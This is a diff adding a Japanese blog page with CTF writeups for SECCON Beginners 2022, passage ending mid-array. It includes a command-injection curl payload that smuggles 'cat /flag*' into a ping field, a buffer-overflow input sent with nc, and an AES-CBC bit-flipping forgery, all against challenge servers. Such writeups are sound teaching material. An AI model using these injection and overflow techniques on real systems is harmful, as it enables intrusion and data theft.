@@ -1,0 +1,269 @@
+<!doctype html><html lang=ja><head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1">
+<link rel=stylesheet href=/sass/main.min.1e6313427b6aca7a7b8a243e45fb955d99cad3ab0ffd4851aee551953705b8ad.css>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css integrity=sha384-KiWOvVjnN8qwAZbuQyWDIbfCLFhLXNETzBQjA/92pIowpC0d2O3nppDGQVgwd2nB crossorigin=anonymous>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.js integrity=sha384-0fdwu/T/EQMsQlrHCCHoH10pkPLlKA1jL5dFyUOvB3lfeT2540/2g6YgSi2BL14p crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous onload=renderMathInElement(document.body)></script>
+<script defer>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script>
+<script defer src=/js/prism.min.js></script>
+<link rel=stylesheet href=/css/prism.min.css>
+</head>
+<body>
+<main id=content>
+<p class=category>
+カテゴリー: <a href=/post>post</a>
+</p>
+<article class=suuri><h1 id=seccon-beginners-2022-ctf4b-writeup>SECCON Beginners 2022 (ctf4b) writeup</h1>
+<h2 id=概要>概要</h2>
+<p>2022/06/04-2022/06/05にかけて行われたSECCON Beginners CTF 2022 (ctf4b) に一人チーム Metronome で参加しました。</p>
+<p>解いた問題は Welcome / Util / hitchhike4b / CoughingFox / Command / Quiz / BeginnersBot / H2 / phisher / Recursive / WinTLS でした。</p>
+<p>結果は順位が 95/891 teams, 得点が 820pt でした。</p>
+<p><img src=./p-1.jpg alt=p-1></p>
+<p><img src=./p-2.png alt=p-2></p>
+<h2 id=詳細>詳細</h2>
+<h3 id=welcome>Welcome</h3>
+<p>discord serverにフラグがあるいつものsanity check。</p>
+<p><code>ctf4b{W3LC0M3_70_53CC0N_B361NN3R5_C7F_2022}</code></p>
+<h3 id=util>Util</h3>
+<p>フロントエンドバリデーションをしているweb問。<br>
+直接リクエストを投げればよい。</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text>curl -X POST https://util.quals.beginners.seccon.jp/util/ping -H &#34;Content-Type: application/json&#34; -d &#39;{&#34;address&#34;: &#34;1.1.1.1 | cat /flag* #&#34;}&#39;
+</code></pre></div><p><code>ctf4b{al1_0vers_4re_i1l}</code></p>
+<h3 id=hitchhike4b>hitchhike4b</h3>
+<p>ソースコードの配布のないmisc問だが、実行すると以下のように表示されるので手元で試す。</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=c1># Source Code</span>
+
+<span class=kn>import</span> <span class=nn>os</span>
+<span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=p>[</span><span class=s2>&#34;PAGER&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;cat&#34;</span> <span class=c1># No hitchhike(SECCON 2021)</span>
+
+<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+    <span class=n>flag1</span> <span class=o>=</span> <span class=s2>&#34;********************FLAG_PART_1********************&#34;</span>
+    <span class=n>help</span><span class=p>()</span> <span class=c1># I need somebody ...</span>
+
+<span class=k>if</span> <span class=vm>__name__</span> <span class=o>!=</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+    <span class=n>flag2</span> <span class=o>=</span> <span class=s2>&#34;********************FLAG_PART_2********************&#34;</span>
+    <span class=n>help</span><span class=p>()</span> <span class=c1># Not just anybody ...</span>
+</code></pre></div><p>手元でガチャガチャしていたら <code>main</code> を入力するとflag1が手に入ることが分かった。しかしリモートではうまく行かず、 <code>__main__</code> の入力で通った。</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>help</span><span class=o>&gt;</span> <span class=n>__main__</span>
+<span class=n>Help</span> <span class=n>on</span> <span class=n>module</span> <span class=n>__main__</span><span class=p>:</span>
+
+<span class=n>NAME</span>
+    <span class=n>__main__</span>
+
+<span class=n>DATA</span>
+    <span class=vm>__annotations__</span> <span class=o>=</span> <span class=p>{}</span>
+    <span class=n>flag1</span> <span class=o>=</span> <span class=s1>&#39;ctf4b{53cc0n_15_1n_m&#39;</span>
+
+<span class=n>FILE</span>
+    <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>ctf</span><span class=o>/</span><span class=n>hitchhike4b</span><span class=o>/</span><span class=n>app_35f13ca33b0cc8c9e7d723b78627d39aceeac1fc</span><span class=o>.</span><span class=n>py</span>
+</code></pre></div><p>しかしflag2が分からない。どうしたものかと思い雑にflagのファイル名から拡張子を抜いたものを入れてみる。2回入れたらflagが出てきた。なぜ&mldr;</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>help</span><span class=o>&gt;</span> <span class=n>app_35f13ca33b0cc8c9e7d723b78627d39aceeac1fc</span>
+<span class=n>Help</span> <span class=n>on</span> <span class=n>module</span> <span class=n>app_35f13ca33b0cc8c9e7d723b78627d39aceeac1fc</span><span class=p>:</span>
+
+<span class=n>NAME</span>
+    <span class=n>app_35f13ca33b0cc8c9e7d723b78627d39aceeac1fc</span>
+
+<span class=n>DATA</span>
+    <span class=n>flag2</span> <span class=o>=</span> <span class=s1>&#39;y_34r5_4nd_1n_my_3y35}&#39;</span>
+
+<span class=n>FILE</span>
+    <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>ctf</span><span class=o>/</span><span class=n>hitchhike4b</span><span class=o>/</span><span class=n>app_35f13ca33b0cc8c9e7d723b78627d39aceeac1fc</span><span class=o>.</span><span class=n>py</span>
+
+</code></pre></div><p><code>ctf4b{53cc0n_15_1n_my_34r5_4nd_1n_my_3y35}</code></p>
+<h3 id=coughingfox>CoughingFox</h3>
+<p>暗号化した出力から元のflagを復元せよというCrypto問。</p>
+<p>まず、shuffleされていることから結果に対しindexでアクセスして何かするのは無理そう。こういう時は総和などのindexによらない指標を考えるとよい。<br>
+と思ったら、そもそも $c_i = (f_i + i)^2 + i$ という形式で生成されているので、 $i$ が小さいことから $i$ で総当たりして引いてみて平方数なら $i$ を確定させていくという方針でよい。</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>cipher</span> <span class=o>=</span> <span class=p>[</span><span class=mi>12147</span><span class=p>,</span> <span class=mi>20481</span><span class=p>,</span> <span class=mi>7073</span><span class=p>,</span> <span class=mi>10408</span><span class=p>,</span> <span class=mi>26615</span><span class=p>,</span> <span class=mi>19066</span><span class=p>,</span> <span class=mi>19363</span><span class=p>,</span> <span class=mi>10852</span><span class=p>,</span> <span class=mi>11705</span><span class=p>,</span> <span class=mi>17445</span><span class=p>,</span> <span class=mi>3028</span><span class=p>,</span> <span class=mi>10640</span><span class=p>,</span> <span class=mi>10623</span><span class=p>,</span> <span class=mi>13243</span><span class=p>,</span> <span class=mi>5789</span><span class=p>,</span> <span class=mi>17436</span><span class=p>,</span> <span class=mi>12348</span><span class=p>,</span> <span class=mi>10818</span><span class=p>,</span> <span class=mi>15891</span><span class=p>,</span> <span class=mi>2818</span><span class=p>,</span> <span class=mi>13690</span><span class=p>,</span> <span class=mi>11671</span><span class=p>,</span> <span class=mi>6410</span><span class=p>,</span> <span class=mi>16649</span><span class=p>,</span> <span class=mi>15905</span><span class=p>,</span> <span class=mi>22240</span><span class=p>,</span> <span class=mi>7096</span><span class=p>,</span> <span class=mi>9801</span><span class=p>,</span> <span class=mi>6090</span><span class=p>,</span> <span class=mi>9624</span><span class=p>,</span> <span class=mi>16660</span><span class=p>,</span> <span class=mi>18531</span><span class=p>,</span> <span class=mi>22533</span><span class=p>,</span> <span class=mi>24381</span><span class=p>,</span> <span class=mi>14909</span><span class=p>,</span> <span class=mi>17705</span><span class=p>,</span> <span class=mi>16389</span><span class=p>,</span> <span class=mi>21346</span><span class=p>,</span> <span class=mi>19626</span><span class=p>,</span> <span class=mi>29977</span><span class=p>,</span> <span class=mi>23452</span><span class=p>,</span> <span class=mi>14895</span><span class=p>,</span> <span class=mi>17452</span><span class=p>,</span> <span class=mi>17733</span><span class=p>,</span> <span class=mi>22235</span><span class=p>,</span> <span class=mi>24687</span><span class=p>,</span> <span class=mi>15649</span><span class=p>,</span> <span class=mi>21941</span><span class=p>,</span> <span class=mi>11472</span><span class=p>]</span>
+
+<span class=kn>import</span> <span class=nn>math</span>
+
+<span class=k>def</span> <span class=nf>is_square</span><span class=p>(</span><span class=n>i</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bool</span><span class=p>:</span>
+    <span class=k>return</span> <span class=n>i</span> <span class=o>==</span> <span class=n>math</span><span class=o>.</span><span class=n>isqrt</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=o>**</span> <span class=mi>2</span>
+
+<span class=n>length</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>cipher</span><span class=p>)</span>
+
+<span class=n>flag</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=n>length</span>
+<span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
+<span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>cipher</span><span class=p>:</span>
+    <span class=k>for</span> <span class=n>l</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>length</span><span class=p>):</span>
+        <span class=k>if</span> <span class=n>is_square</span><span class=p>(</span><span class=n>c</span><span class=o>-</span><span class=n>l</span><span class=p>):</span>
+            <span class=n>f</span> <span class=o>=</span> <span class=n>math</span><span class=o>.</span><span class=n>isqrt</span><span class=p>(</span><span class=n>c</span><span class=o>-</span><span class=n>l</span><span class=p>)</span><span class=o>-</span><span class=n>l</span>
+            <span class=n>flag</span><span class=p>[</span><span class=n>l</span><span class=p>]</span> <span class=o>=</span> <span class=n>f</span>
+<span class=nb>print</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>chr</span><span class=p>(</span><span class=n>x</span><span class=p>)</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>flag</span><span class=p>]))</span>
+</code></pre></div><p><code>ctf4b{Hey,Fox?YouCanNotTearThatHouseDown,CanYou?}</code></p>
+<h3 id=command>Command</h3>
+<p>AESのCBC modeの暗号文から別の暗号文を生成せよというCrypto問。今回はブロックが16byteで1ブロック、かつivを指定できるので平文を自由に操作することができる。</p>
+<p><a href=https://sonickun.hatenablog.com/entry/2016/05/07/202422>Google CTF 2016 Writeup - Eucalypt Forest, Wolf Spider - sonickun.log</a> を参考にして、組み立てる。</p>
+<p>と思ったらうまく行かない。pad/unpad周りが理解できてない雰囲気を感じ取り調べる</p>
+<p><a href=https://masahikosawada.github.io/2020/02/10/OpenSSL-Padding/>OpenSSLでAES暗号したときのPadding</a> この記事が参考になってpaddingを理解。</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=c1># h = &#39;cbc6c6c6e80f15da5061486adeffad36b98599fadfa3ed853c1922a86f121e4d&#39;</span>
+<span class=n>h</span> <span class=o>=</span> <span class=s1>&#39;778da59a00ef76e40d067b6ba8b384af86a1d2c6bc32a15e9cd59b5c57ae35ee&#39;</span>
+
+<span class=n>b</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>h</span><span class=p>)</span>
+<span class=n>iv</span> <span class=o>=</span> <span class=n>b</span><span class=p>[:</span><span class=mi>16</span><span class=p>]</span>
+<span class=n>enc</span> <span class=o>=</span> <span class=n>b</span><span class=p>[</span><span class=mi>16</span><span class=p>:]</span>
+
+<span class=nb>print</span><span class=p>(</span><span class=n>iv</span><span class=p>,</span> <span class=n>enc</span><span class=p>)</span>
+<span class=c1># fizzbuzz</span>
+<span class=c1># getflag</span>
+<span class=n>text1</span> <span class=o>=</span> <span class=s1>&#39;getflag</span><span class=se>\x09\x09\x09\x09\x09\x09\x09\x09\x09</span><span class=s1>&#39;</span>
+<span class=c1># text2 = &#39;primes\x08&#39;</span>
+<span class=n>text2</span> <span class=o>=</span> <span class=s1>&#39;fizzbuzz</span><span class=se>\x08\x08\x08\x08\x08\x08\x08\x08</span><span class=s1>&#39;</span>
+<span class=n>L</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>text1</span><span class=p>)</span>
+<span class=n>arr</span> <span class=o>=</span> <span class=p>[]</span>
+<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>L</span><span class=p>):</span>
+    <span class=n>t</span> <span class=o>=</span> <span class=nb>ord</span><span class=p>(</span><span class=n>text1</span><span class=p>[</span><span class=n>i</span><span class=p>])</span><span class=o>^</span><span class=nb>ord</span><span class=p>(</span><span class=n>text2</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
+    <span class=n>arr</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>t</span><span class=p>)</span>
+<span class=n>ans</span> <span class=o>=</span> <span class=p>[]</span>
+<span class=nb>print</span><span class=p>(</span><span class=n>arr</span><span class=p>)</span>
+<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>L</span><span class=p>):</span>
+    <span class=n>by</span> <span class=o>=</span> <span class=n>iv</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>^</span><span class=n>arr</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
+    <span class=n>ans</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>by</span><span class=p>)</span>
+<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>L</span><span class=p>,</span><span class=mi>16</span><span class=p>):</span>
+    <span class=n>ans</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>iv</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
+<span class=nb>print</span><span class=p>((</span><span class=nb>bytes</span><span class=p>(</span><span class=n>ans</span><span class=p>)</span> <span class=o>+</span> <span class=n>enc</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>())</span>
+</code></pre></div><p>出てきたコードを 2 の暗号文を戻して実行するやつに突っ込むとフラグを得る。</p>
+<p><code>ctf4b{b1tfl1pfl4ppers}</code></p>
+<p>個人的にはCommandが優勝だと思った。AESの仕組み理解に役立つと感じたし、自分があまりAES理解していなかったのがこれで理解深まったので。</p>
+<h3 id=quiz>Quiz</h3>
+<p>rev問。</p>
+<p>radare2で <code>s &lt;tab></code> すると、</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text>ctf4b_w0w_d1d_y0u_ca7ch_7h3_fl4g_1n_0n3_sh07
+</code></pre></div><p>あきらかに怪しい。そのままでは通らない。</p>
+<p>記号かな？とちょっと考えて以下で通った。</p>
+<p><code>ctf4b{w0w_d1d_y0u_ca7ch_7h3_fl4g_1n_0n3_sh07?}</code></p>
+<h3 id=beginnersbot>BeginnersBot</h3>
+<p>初心者向けバッファオーバーフローのPwn問。</p>
+<p>gdb-pedaとpattcとpattoあたりを眺めつつ地道にpayloadを作った。16byte alignmentは気にした気がする。</p>
+<p>以下のようなファイルを用意 (<code>python3 -c 'print("A"*... + "\x00...")' > input_debug_0</code> のようにして生成)</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text>❯ hexdump input_debug_0 
+0000000 3436 410a 4141 4141 4141 4141 4141 4141
+0000010 4141 4141 4141 4141 4141 4141 4141 4141
+0000020 4141 4141 4141 4141 4141 e6c3 4011 0000
+0000030 0000 0a00                              
+0000034
+</code></pre></div><p><code>./chall &lt; input_debug_0</code> でうまくいくことを確認して、ncで接続</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text>❯ nc beginnersbof.quals.beginners.seccon.jp 9000 &lt; input_debug_0 
+How long is your name?
+What&#39;s your name?
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��@ctf4b{Y0u_4r3_4lr34dy_4_BOF_M45t3r!}
+Segmentation fault
+</code></pre></div><p><code>ctf4b{Y0u_4r3_4lr34dy_4_BOF_M45t3r!}</code></p>
+<h3 id=h2>H2</h3>
+<p>pcapが配られるmisc問。</p>
+<p>wiresharkで見るとき、Http2なのでdecode asしてやる</p>
+<p>header count 5でfilter</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text>Frame 739024: 165 bytes on wire (1320 bits), 165 bytes captured (1320 bits)
+Ethernet II, Src: 00:00:00_00:00:00 (00:00:00:00:00:00), Dst: 00:00:00_00:00:00 (00:00:00:00:00:00)
+Internet Protocol Version 4, Src: 127.0.0.1, Dst: 127.0.0.1
+Transmission Control Protocol, Src Port: 8080, Dst Port: 58020, Seq: 56, Ack: 118, Len: 99
+HyperText Transfer Protocol 2
+    Stream: HEADERS, Stream ID: 1, Length 90, 200 OK
+        Length: 90
+        Type: HEADERS (1)
+        Flags: 0x04
+        0... .... .... .... .... .... .... .... = Reserved: 0x0
+        .000 0000 0000 0000 0000 0000 0000 0001 = Stream Identifier: 1
+        [Pad Length: 0]
+        Header Block Fragment: 884085f2b4b40e6fa122656a3fffd3a5358a2b5054458f5c…
+        [Header Length: 184]
+        [Header Count: 5]
+        Header: :status: 200 OK
+        Header: x-flag: ctf4b{http2_uses_HPACK_and_huffm4n_c0ding}
+            Name Length: 6
+            Name: x-flag
+            Value Length: 42
+            Value: ctf4b{http2_uses_HPACK_and_huffm4n_c0ding}
+            [Unescaped: ctf4b{http2_uses_HPACK_and_huffm4n_c0ding}]
+            Representation: Literal Header Field with Incremental Indexing - New Name
+        Header: content-type: text/plain; charset=utf-8
+        Header: content-length: 23
+        Header: date: Tue, 31 May 2022 15:03:15 GMT
+
+</code></pre></div><p><code>ctf4b{http2_uses_HPACK_and_huffm4n_c0ding}</code></p>
+<h3 id=phisher>phisher</h3>
+<p>はじめはhomograph attack makerとかで検索してたけどうまくいかない。</p>
+<p>Dockerファイルが配られているので、以下のようなコードを書いて総当たり</p>
+<p><code>o</code> を探す例</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0xff</span><span class=p>,</span><span class=mh>0xffff</span><span class=p>):</span>
+        <span class=n>c</span> <span class=o>=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
+        <span class=n>c</span> <span class=o>=</span> <span class=s2>&#34;www.examle.c</span><span class=si>{}</span><span class=s2>m&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>c</span><span class=p>)</span>
+        <span class=n>out</span> <span class=o>=</span> <span class=n>ocr</span><span class=p>(</span><span class=n>text2png</span><span class=p>(</span><span class=n>c</span><span class=p>))</span>
+        <span class=k>if</span> <span class=s1>&#39;o&#39;</span> <span class=ow>in</span> <span class=n>out</span><span class=p>:</span>
+            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;char = &#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>,</span> <span class=s2>&#34; out = &#34;</span><span class=p>,</span> <span class=n>out</span><span class=p>)</span>
+</code></pre></div><p><img src=p-3.jpg alt=p-3></p>
+<p><code>ctf4b{n16h7_ph15h1n6_15_600d}</code></p>
+<h3 id=recursive>Recursive</h3>
+<p>ELFのrev問。<br>
+途中、tableという変数を元に比較を行うcheck関数がghidraで見つかる。tableをガッと取ってきて、flagの長さを調節してみた。</p>
+<p>比較の最後でindexと比較対象のtableの値を出力すれば正しいflagが出てくる。</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>table</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x2a</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x2b</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x2e</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x7b</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x2f</span><span class=p>,</span> <span class=mh>0x7d</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x3a</span><span class=p>,</span> <span class=mh>0x7b</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0x3b</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x6f</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x2a</span><span class=p>,</span> <span class=mh>0x3c</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x2c</span><span class=p>,</span> <span class=mh>0x6e</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x3f</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x6f</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x6e</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x2b</span><span class=p>,</span> <span class=mh>0x6a</span><span class=p>,</span> <span class=mh>0x2d</span><span class=p>,</span> <span class=mh>0x7b</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x2f</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x7c</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x2b</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x2e</span><span class=p>,</span> <span class=mh>0x7a</span><span class=p>,</span> <span class=mh>0x7b</span><span class=p>,</span> <span class=mh>0x5f</span><span class=p>,</span> <span class=mh>0x6e</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x7b</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x3c</span><span class=p>,</span> <span class=mh>0x3d</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x5f</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x5f</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x6f</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0x3e</span><span class=p>,</span> <span class=mh>0x3f</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x3c</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x7c</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x3c</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x2f</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x2c</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x6b</span><span class=p>,</span> <span class=mh>0x2d</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x7b</span><span class=p>,</span> <span class=mh>0x3d</span><span class=p>,</span> <span class=mh>0x3b</span><span class=p>,</span> <span class=mh>0x7b</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x2c</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x6b</span><span class=p>,</span> <span class=mh>0x6b</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x7d</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x3c</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x3a</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0x2c</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x32</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x3f</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x3e</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x6f</span><span class=p>,</span> <span class=mh>0x6f</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x36</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x3a</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x5f</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x5f</span><span class=p>,</span> <span class=mh>0x2b</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x2e</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span 